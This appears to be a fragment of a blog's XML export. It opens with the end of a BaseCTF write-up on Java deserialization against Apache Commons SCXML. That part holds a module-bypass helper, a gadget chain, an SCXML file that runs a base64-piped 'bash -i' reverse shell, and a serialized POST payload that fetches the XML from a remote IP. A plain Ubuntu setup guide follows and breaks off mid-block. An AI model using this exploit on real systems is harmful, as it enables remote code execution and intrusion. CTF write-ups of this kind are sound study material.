class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe)field.get((Object)<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> unsafe;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bypassModule</span><span class="params">(Class src, Class dst)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> getUnsafe();</span><br><span class="line">        <span class="type">long</span> <span class="variable">addr</span> <span class="operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">        unsafe.getAndSetObject(src, addr, unsafe.getObject(dst,unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>))));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​链子</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EventListenerList#readObject-&gt;InvokerImpl#toString-&gt;SimpleSCXMLInvoker#invoke-&gt;SCXMLExecutor#go</span><br></pre></td></tr></table></figure><p>​外部加载XML</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">state</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">onentry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="string">&#x27;&#x27;</span>.<span class="title function_">getClass</span>().<span class="title function_">forName</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&#x27;bash -c &#123;echo,bash -i的密文&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">onentry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/scxml?rO0ABXNyACNqYXZheC5zd2luZy5ldmVudC5FdmVudExpc3RlbmVyTGlzdJFIzC1z3w7eAwAAeHB0ABdqYXZhLmxhbmcuSW50ZXJuYWxFcnJvcnNyABxqYXZheC5zd2luZy51bmRvLlVuZG9NYW5hZ2Vy8X6fHQgqwh0CAAJJAA5pbmRleE9mTmV4dEFkZEkABWxpbWl0eHIAHWphdmF4LnN3aW5nLnVuZG8uQ29tcG91bmRFZGl0pZ5QulPblf0CAAJaAAppblByb2dyZXNzTAAFZWRpdHN0ABJMamF2YS91dGlsL1ZlY3Rvcjt4cgAlamF2YXguc3dpbmcudW5kby5BYnN0cmFjdFVuZG9hYmxlRWRpdAgNG47tAgsQAgACWgAFYWxpdmVaAAtoYXNCZWVuRG9uZXhwAQEBc3IAEGphdmEudXRpbC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAGRzcgAVY29tLm4xZ2h0Lkludm9rZXJJbXBskzknNs6grL8CAANMAAFvdAAqTG9yZy9hcGFjaGUvY29tbW9ucy9zY3htbDIvaW52b2tlL0ludm9rZXI7TAAGcGFyYW1zdAAPTGphdmEvdXRpbC9NYXA7TAAGc291cmNldAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAzb3JnLmFwYWNoZS5jb21tb25zLnNjeG1sMi5pbnZva2UuU2ltcGxlU0NYTUxJbnZva2VyAAAAAAAAAAECAAVaAAljYW5jZWxsZWRMAAtldmVudFByZWZpeHEAfgAQTAAIZXhlY3V0b3J0AClMb3JnL2FwYWNoZS9jb21tb25zL3NjeG1sMi9TQ1hNTEV4ZWN1dG9yO0wAEHBhcmVudFNDSW5zdGFuY2V0ACZMb3JnL2FwYWNoZS9jb21tb25zL3NjeG1sMi9TQ0luc3RhbmNlO0wADXBhcmVudFN0YXRlSWRxAH4AEHhwAHBwc3IAJG9yZy5hcGFjaGUuY29tbW9ucy5zY3htbDIuU0NJbnN0YW5jZQAAAAAAAAACAgAKTAALY29tcGxldGlvbnNxAH4AD0wACGNvbnRleHRzcQB+AA9MAAlldmFsdWF0b3J0ACVMb3JnL2FwYWNoZS9jb21tb25zL3NjeG1sMi9FdmFsdWF0b3I7TAAIZXhlY3V0b3JxAH4AE0wACWhpc3Rvcmllc3EAfgAPTAAUaW5pdGlhbFNjcmlwdENvbnRleHR0ACNMb3JnL2FwYWNoZS9jb21tb25zL3NjeG1sMi9Db250ZXh0O0wADmludm9rZXJDbGFzc2VzcQB+AA9MAAhpbnZva2Vyc3EAfgAPTAAUbm90aWZpY2F0aW9uUmVnaXN0cnl0ADBMb3JnL2FwYWNoZS9jb21tb25zL3NjeG1sMi9Ob3RpZmljYXRpb25SZWdpc3RyeTtMAAtyb290Q29udGV4dHEAfgAYeHBzcgAlamF2YS51dGlsLkNvbGxlY3Rpb25zJFN5bmNocm9uaXplZE1hcBtz+QlLSzl7AwACTAABbXEAfgAPTAAFbXV0ZXh0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHEAfgAdeHNxAH4AG3NxAH4AHj9AAAAAAAAAdwgAAAAQAAAAAHhxAH4AIHhzcgAwb3JnLmFwYWNoZS5jb21tb25zLnNjeG1sMi5lbnYuamV4bC5KZXhsRXZhbHVhdG9yAAAAAAAAAAECAAJaABBqZXhsRW5naW5lU2lsZW50WgAQamV4bEVuZ2luZVN0cmljdHhwAABzcgAnb3JnLmFwYWNoZS5jb21tb25zLnNjeG1sMi5TQ1hNTEV4ZWN1dG9yAAAAAAAAAAECAAhaAAlzdXBlclN0ZXBMAA1jdXJyZW50U3RhdHVzdAAiTG9yZy9hcGFjaGUvY29tbW9ucy9zY3htbDIvU3RhdHVzO0wADWVycm9yUmVwb3J0ZXJ0AClMb3JnL2FwYWNoZS9jb21tb25zL3NjeG1sMi9FcnJvclJlcG9ydGVyO0wAD2V2ZW50ZGlzcGF0Y2hlcnQAK0xvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL0V2ZW50RGlzcGF0Y2hlcjtMAANsb2d0ACBMb3JnL2FwYWNoZS9jb21tb25zL2xvZ2dpbmcvTG9nO0wACnNjSW5zdGFuY2VxAH4AFEwACXNlbWFudGljc3QAKkxvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL1NDWE1MU2VtYW50aWNzO0wADHN0YXRlTWFjaGluZXQAJ0xvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL21vZGVsL1NDWE1MO3hwAXNyACBvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLlN0YXR1cwAAAAAAAAABAgACTAAGZXZlbnRzdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO0wABnN0YXRlc3QAD0xqYXZhL3V0aWwvU2V0O3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4c3IAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAAB4cHcMAAAAED9AAAAAAAAAeHBwc3IAK29yZy5hcGFjaGUuY29tbW9ucy5sb2dnaW5nLmltcGwuSmRrMTRMb2dnZXJCZref4CqgvAIAAUwABG5hbWVxAH4AEHhwdAAnb3JnLmFwYWNoZS5jb21tb25zLnNjeG1sMi5TQ1hNTEV4ZWN1dG9yc3EAfgAWc3EAfgAbc3EAfgAeP0AAAAAAAAB3CAAAABAAAAAAeHEAfgA4eHNxAH4AG3NxAH4AHj9AAAAAAAAAdwgAAAAQAAAAAHhxAH4AOnhzcQB+ACIAAHEAfgArc3EAfgAbc3EAfgAeP0AAAAAAAAB3CAAAABAAAAAAeHEAfgA9eHBzcQB+ABtzcQB+AB4/QAAAAAAAAHcIAAAAEAAAAAB4cQB+AD94c3EAfgAbc3EAfgAeP0AAAAAAAAB3CAAAABAAAAAAeHEAfgBBeHNyAC5vcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLk5vdGlmaWNhdGlvblJlZ2lzdHJ5AAAAAAAAAAECAAFMAARyZWdzcQB+AA94cHNxAH4AG3NxAH4AHj9AAAAAAAAAdwgAAAAQAAAAAHhxAH4ARXhwc3IANm9yZy5hcGFjaGUuY29tbW9ucy5zY3htbDIuc2VtYW50aWNzLlNDWE1MU2VtYW50aWNzSW1wbAAAAAAAAAABAgACTAAGYXBwTG9ncQB+AChMABB0YXJnZXRDb21wYXJhdG9ydABATG9yZy9hcGFjaGUvY29tbW9ucy9zY3htbDIvc2VtYW50aWNzL1RyYW5zaXRpb25UYXJnZXRDb21wYXJhdG9yO3hwc3EAfgA0dAAob3JnLmFwYWNoZS5jb21tb25zLnNjeG1sMi5TQ1hNTFNlbWFudGljc3NyAD5vcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLnNlbWFudGljcy5UcmFuc2l0aW9uVGFyZ2V0Q29tcGFyYXRvcgAAAAAAAAABAgAAeHBwc3EAfgAbc3EAfgAeP0AAAAAAAAB3CAAAABAAAAAAeHEAfgBOeHBzcQB+ABtzcQB+AB4/QAAAAAAAAHcIAAAAEAAAAAB4cQB+AFB4c3EAfgAbc3EAfgAeP0AAAAAAAAB3CAAAABAAAAAAeHEAfgBSeHNxAH4AQ3NxAH4AG3NxAH4AHj9AAAAAAAAAdwgAAAAQAAAAAHhxAH4AVXhwcHNxAH4AHj9AAAAAAAAAdwgAAAAQAAAAAHh0AB9odHRwOi8vMTEyLjEyNC41OS4yMTMvc2N4bTIueG1scHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBweAAAAAAAAABkcHg=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>112.124.59.213:8000</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteWp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> CTF </tag>
            
            <tag> WriteWp </tag>
            
            <tag> BaseCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu安装配置指南</title>
      <link href="/post/d5b10a94.html"/>
      <url>/post/d5b10a94.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="ubuntu简介"><a href="#ubuntu简介" class="headerlink" title="ubuntu简介"></a>ubuntu简介</h2><p>​<code>Ubuntu</code>是一个以桌面应用为主的<strong>Linux发行版</strong>操作系统，其名称来自非洲南部祖鲁语或豪萨语的”ubuntu“一词，意思是“人性”“我的存在是因为大家的存在”，是非洲传统的一种价值观。Ubuntu基于<strong>Debian发行版</strong>和<strong>GNOME桌面环境</strong>，而从11.04版起，Ubuntu发行版放弃了GNOME桌面环境，改为<strong>Unity</strong>。此前人们认为Linux难以安装、难以使用，在Ubuntu出现后这些都成为了历史。Ubuntu也拥有庞大的社区力量，用户可以方便地从社区获得帮助。自Ubuntu 18.04 LTS起，Ubuntu发行版重新开始使用GNOME3桌面环境。</p><h1 id="通用必备配置"><a href="#通用必备配置" class="headerlink" title="通用必备配置"></a>通用必备配置</h1><h2 id="更换软件源"><a href="#更换软件源" class="headerlink" title="更换软件源"></a>更换软件源</h2><h3 id="备份list文件"><a href="#备份list文件" class="headerlink" title="备份list文件"></a>备份list文件</h3><p>失败了也可以回溯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/apt/</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> sources.list sources.list.bak</span><br></pre></td></tr></table></figure><h3 id="更改list文件"><a href="#更改list文件" class="headerlink" title="更改list文件"></a>更改list文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vi /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>替换其中内容，更换为阿里源</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><h3 id="更新软件列表"><a href="#更新软件列表" class="headerlink" title="更新软件列表"></a>更新软件列表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update 或 <span class="built_in">sudo</span> apt-get update<span class="comment"># 更新软件列表</span></span><br><span class="line"><span class="built_in">sudo</span> apt upgrade 或 <span class="built_in">sudo</span> apt upgrade<span class="comment"># 更新软件</span></span><br></pre></td></tr></table></figure><h2 id="更改root密码"><a href="#更改root密码" class="headerlink" title="更改root密码"></a>更改root密码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> passwd root</span><br></pre></td></tr></table></figure><p>跟随指引操作即可</p><h2 id="构建工具安装"><a href="#构建工具安装" class="headerlink" title="构建工具安装"></a>构建工具安装</h2><p>安装gcc、g++、make等</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install build-essential</span><br></pre></td></tr></table></figure><h2 id="Git安装"><a href="#Git安装" class="headerlink" title="Git安装"></a>Git安装</h2><p>常用于拉取github上的一些工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install git</span><br><span class="line">git --version  <span class="comment"># 查看版本号</span></span><br></pre></td></tr></table></figure><h2 id="vim安装"><a href="#vim安装" class="headerlink" title="vim安装"></a>vim安装</h2><p>常用文本编辑器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install vim</span><br><span class="line">vim -v  <span class="comment"># 查看版本号</span></span><br></pre></td></tr></table></figure><h2 id="安装glibc-doc"><a href="#安装glibc-doc" class="headerlink" title="安装glibc-doc"></a>安装glibc-doc</h2><p>GNU C Library (glibc) 的文档</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install glibc-doc</span><br></pre></td></tr></table></figure><h2 id="安装python2及pip2"><a href="#安装python2及pip2" class="headerlink" title="安装python2及pip2"></a>安装python2及pip2</h2><p>一些python脚本需要在python2环境下运行</p><h3 id="安装python2"><a href="#安装python2" class="headerlink" title="安装python2"></a>安装python2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python2</span><br><span class="line">python2 --version <span class="comment"># 查看版本号</span></span><br></pre></td></tr></table></figure><h3 id="安装pip2"><a href="#安装pip2" class="headerlink" title="安装pip2"></a>安装pip2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl https://bootstrap.pypa.io/pip/&lt;你的python2版本，例如2.7&gt;/get-pip.py --output get-pip.py <span class="comment"># 下载安装文件</span></span><br><span class="line"><span class="built_in">sudo</span> python2 get-pip.py <span class="comment"># 安装pip2</span></span><br><span class="line">pip2 --version <span class="comment"># 查看版本号</span></span><br><span class="line"><span class="built_in">rm</span> get-pip.py <span class="comment"># 安装完成后删除get-pip.py</span></span><br></pre></td></tr></table></figure><h2 id="安装pip3"><a href="#安装pip3" class="headerlink" title="安装pip3"></a>安装pip3</h2><p>常用python版本，一般自带了python3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python3-pip</span><br><span class="line">pip --version 或 pip3 --version <span class="comment"># 查看版本号</span></span><br></pre></td></tr></table></figure><h2 id="pip换源-清华源"><a href="#pip换源-清华源" class="headerlink" title="pip换源(清华源)"></a>pip换源(清华源)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ~/.pip 或 <span class="built_in">mkdir</span> -p ~/.config/pip</span><br><span class="line"><span class="built_in">cd</span> ~/.pip 或 <span class="built_in">cd</span> ~/.config/pip</span><br><span class="line">vim pip.conf</span><br></pre></td></tr></table></figure><p>修改pip.conf的内容为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line"> </span><br><span class="line">index-url=https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"> </span><br><span class="line"><span class="built_in">timeout</span> = 6000</span><br><span class="line"> </span><br><span class="line">[install]</span><br><span class="line"> </span><br><span class="line">trusted-host=pypi.tuna.tsinghua.edu.cn</span><br><span class="line"> </span><br><span class="line">disable-pip-version-check = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>其他源</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://pypi.douban.com/  <span class="comment"># 豆瓣</span></span><br><span class="line">https://pypi.hustunique.com/  <span class="comment">#  华中理工大学</span></span><br><span class="line">https://pypi.sdutlinux.org/  <span class="comment"># 山东理工大学</span></span><br><span class="line">https://pypi.mirrors.ustc.edu.cn/  <span class="comment"># 中国科学技术大学</span></span><br><span class="line">https://mirrors.aliyun.com/pypi/simple/  <span class="comment"># 阿里云</span></span><br><span class="line">https://pypi.tuna.tsinghua.edu.cn/simple/  <span class="comment"># 清华大学</span></span><br></pre></td></tr></table></figure><h1 id="其他软件安装"><a href="#其他软件安装" class="headerlink" title="其他软件安装"></a>其他软件安装</h1><h2 id="安装fd"><a href="#安装fd" class="headerlink" title="安装fd"></a>安装fd</h2><p>​项目地址<a href="https://github.com/cha0ran/fd-zh">cha0ran&#x2F;fd-zh: fd Chinese document</a></p><p>​<code>fd</code> 是一个在你文件系统中查找条目的程序。它是一个简单、快速、友好的 <a href="https://www.gnu.org/software/findutils/"><code>find</code></a> 替代品。</p><p>​在ubuntu19.04及更新版本安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt install fd-find  <span class="comment"># 安装</span></span><br><span class="line"></span><br><span class="line">vim /root/.bashrc</span><br><span class="line"><span class="comment"># 在最后添加一行alias fd=&#x27;fdfind&#x27;</span></span><br><span class="line"><span class="built_in">source</span> /root/.bashrc <span class="comment"># 刷新</span></span><br><span class="line">fd -h <span class="comment"># 检查</span></span><br></pre></td></tr></table></figure><p>​</p><h2 id="安装anaconda"><a href="#安装anaconda" class="headerlink" title="安装anaconda"></a>安装anaconda</h2><p>多环境切换工具</p><h3 id="查找并安装所需版本"><a href="#查找并安装所需版本" class="headerlink" title="查找并安装所需版本"></a>查找并安装所需版本</h3><p>在<a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/?C=M&O=A">清华大学开源软件镜像站 </a>中查找符合自己版本的anaconda</p><p>这里选择<code>https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/Anaconda3-2024.06-1-Linux-x86_64.sh</code>这个版本，安装其他版本替换相应链接即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget --user-agent=“Mozilla” + https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/Anaconda3-2024.06-1-Linux-x86_64.sh  <span class="comment"># 下载</span></span><br><span class="line">bash Anaconda3-2024.06-1-Linux-x86_64.sh  <span class="comment"># 跟随提示安装</span></span><br><span class="line">vim /etc/profile <span class="comment"># 添加环境变量 export PATH=~/anaconda3/bin:$PATH (具体路径以自身安装位置位置)</span></span><br><span class="line">vim ~/.bashrc <span class="comment"># 添加环境变量 export PATH=~/anaconda3/bin:$PATH (具体路径以自身安装位置位置)</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc  <span class="comment"># 更新环境变量</span></span><br><span class="line">conda -V  <span class="comment"># 查看版本号</span></span><br><span class="line"><span class="built_in">rm</span> Anaconda3-2024.06-1-Linux-x86_64.sh  <span class="comment"># 安装完成后清除安装文件</span></span><br></pre></td></tr></table></figure><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 清华源</span></span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/msys2/</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/</span><br><span class="line">conda config --<span class="built_in">set</span> show_channel_urls <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 中科大源</span></span><br><span class="line">conda config --add channels https://mirrors.ustc.edu.cn/anaconda/pkgs/main/</span><br><span class="line">conda config --add channels https://mirrors.ustc.edu.cn/anaconda/pkgs/free/</span><br><span class="line">conda config --add channels https://mirrors.ustc.edu.cn/anaconda/cloud/conda-forge/</span><br><span class="line">conda config --add channels https://mirrors.ustc.edu.cn/anaconda/cloud/msys2/</span><br><span class="line">conda config --add channels https://mirrors.ustc.edu.cn/anaconda/cloud/bioconda/</span><br><span class="line">conda config --add channels https://mirrors.ustc.edu.cn/anaconda/cloud/menpo/</span><br><span class="line">conda config --<span class="built_in">set</span> show_channel_urls <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line">conda config --remove-key channels  <span class="comment"># 恢复默认源</span></span><br><span class="line">conda config --show  <span class="comment"># 查看源</span></span><br></pre></td></tr></table></figure><p>conda常用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">conda update -n base -c defaults conda  <span class="comment"># 如果版本不是最新，可用此命令更新</span></span><br><span class="line">conda create -n &lt;虚拟环境名称&gt; python=&lt;X.X(3.6、3.7等)&gt;  <span class="comment"># 创建虚拟环境</span></span><br><span class="line"><span class="built_in">source</span> activate &lt;虚拟环境名称&gt;  <span class="comment"># 激活虚拟环境</span></span><br><span class="line"><span class="built_in">source</span> deactivate &lt;虚拟环境名称&gt;  <span class="comment"># 退出虚拟环境</span></span><br><span class="line">conda remove -n &lt;虚拟环境名称&gt; --all  <span class="comment"># 删除虚拟环境</span></span><br><span class="line">conda list  <span class="comment"># 查看安装了哪些包</span></span><br><span class="line">conda install &lt;包名&gt;  <span class="comment"># 安装包</span></span><br><span class="line">conda install scrapy==1.3 <span class="comment"># 安装指定版本的包</span></span><br><span class="line">conda install -n &lt;环境名&gt; &lt;包名&gt; <span class="comment"># 在conda指定的某个环境中安装包</span></span><br><span class="line">conda <span class="built_in">env</span> list 或 conda info -e 或   <span class="comment"># 查看当前存在哪些虚拟环境</span></span><br><span class="line">conda update conda  <span class="comment"># 检查更新当前conda</span></span><br><span class="line">conda update anaconda  <span class="comment"># 更新anaconda</span></span><br><span class="line">conda update --all  <span class="comment"># 更新所有库</span></span><br><span class="line">conda update python  <span class="comment"># 更新python</span></span><br></pre></td></tr></table></figure><h2 id="xrdp安装"><a href="#xrdp安装" class="headerlink" title="xrdp安装"></a>xrdp安装</h2><p>​微软的远程桌面协议（RDP） 是一个允许从一台计算机到另一台计算机进行图形化远程桌面连接的协议。RDP 的工作原理是让一台主机运行软件，允许其他几台计算机连接到它。</p><p>​XRDP是 RDP 的一个开源实现，不需要运行任何专有程序。XRDP 不仅试图遵循 RDP，而且还与常规的 RDP 客户端兼容，如Remmina和GNOME Boxes。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line"><span class="built_in">sudo</span> apt install xrdp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令行启动</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl set-default multi-user.target</span><br><span class="line"></span><br><span class="line"><span class="comment"># 